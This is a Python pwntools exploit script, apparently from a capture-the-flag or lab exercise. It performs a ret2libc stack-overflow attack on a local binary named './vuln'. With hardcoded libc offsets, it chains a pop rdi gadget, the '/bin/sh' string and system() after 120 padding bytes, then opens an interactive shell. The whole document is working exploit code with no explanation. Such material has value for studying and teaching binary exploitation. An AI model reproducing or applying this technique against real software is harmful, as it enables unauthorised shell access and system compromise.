#!/usr/bin/python3
# coding: utf-8

from pwn import *

libc_base = 0x00007ffff7de9000
system_addr = libc_base + 0x49850
binsh_addr = libc_base + 0x188962
pop_rdi = libc_base + 0x27c2d

log.info ("system: " + str(hex(system_addr)))
log.info ("binsh: " + str(hex(binsh_addr)))
log.info ("pop_rdi: " + str(hex(pop_rdi)))

pause()

p = process ("./vuln")

payload = b""
payload += b"A"*120
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.recv()
p.interactive()
